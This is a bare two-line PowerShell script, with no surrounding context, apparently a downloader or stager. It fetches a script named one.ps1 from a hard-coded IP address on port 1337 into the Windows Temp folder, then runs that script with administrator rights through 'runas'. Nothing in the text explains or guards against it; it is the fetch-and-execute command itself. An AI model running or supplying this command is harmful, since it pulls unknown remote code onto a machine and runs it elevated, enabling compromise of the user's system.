
Invoke-WebRequest "http://37.187.176.161:1337/one.ps1" -OutFile "C:\WINDOWS\Temp\one.ps1"

Start-Process powershell -verb runas -ArgumentList "-file C:\WINDOWS\Temp\one.ps1"
